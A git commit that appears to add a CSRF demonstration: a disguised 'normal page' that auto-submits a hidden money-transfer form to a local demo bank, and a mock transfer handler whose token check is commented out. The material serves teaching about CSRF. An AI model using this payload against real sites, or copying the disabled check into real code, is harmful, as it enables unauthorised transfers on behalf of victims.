4d7e79129d682f3aa4483cc050c8bd056959a4bb
Danny <nz_danny_boy@hotmail.com>
2017-05-08 16:37:11 +1200

    Finished

---
+++ hacker.php
@@ -0,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>Normal page</title>
+    </head>
+    <body>
+        <h1>This page is normal</h1>
+
+        <iframe style="display:none" name="csrf-frame"></iframe>
+        <form method='POST' style="display:none" action='http://csrf.dev/index.php' target="csrf-frame" id="csrf-form">
+            <input name="account" value="2345534534534535">
+
+            <input name="toAccount" value="00-210312313-125"><!-- hackers account -->
+
+            <input name="amount" value="$43534534535345345">
+
+          <input type='submit' value='submit'>
+        </form>
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
---
+++ index.php
@@ -0,0 +1,44 @@
+<?php
+
+require 'config.php';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // if (!empty($_SESSION['csrf']) && $_SESSION['csrf'] === $_POST['csrf']) {
+        // die(var_dump($_POST));
+        die('$' . $_POST['amount'] . ' has been transferred to ' . $_POST['toAccount']);
+    // }
+    // die('The CSRF token does not match!');
+}
+
+// To counter this we need to generate a unique string that is included on every page
+$_SESSION['csrf'] = bin2hex(random_bytes(10));
+
+?><!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>CSRF Forms</title>
+    </head>
+    <body>
+        <form method="POST" action="index.php">
+            <label for="account">Account:</label>
+            <select name="account">
+                <option value="">Select one...</option>
+                <option value="00-210312313-123">Cheque - 00-210312313-123</option>
+                <option value="00-210312313-124">Savings - 00-210312313-124</option>
+                <option value="00-210312313-125">Holiday - 00-210312313-125</option>
+            </select>
+
+            <label for="toAccount">To account:</label>
+            <input name="toAccount" placeholder="00-210312313-125">
+
+            <label for="amount">Amount:</label>
+            <input name="amount" placeholder="$123.45">
+
+
+            <input name="csrf" value="<?=$_SESSION['csrf'];?>" hidden>
+
+            <input type="submit" value="Transfer">
+        </form>
+    </body>
+</html>
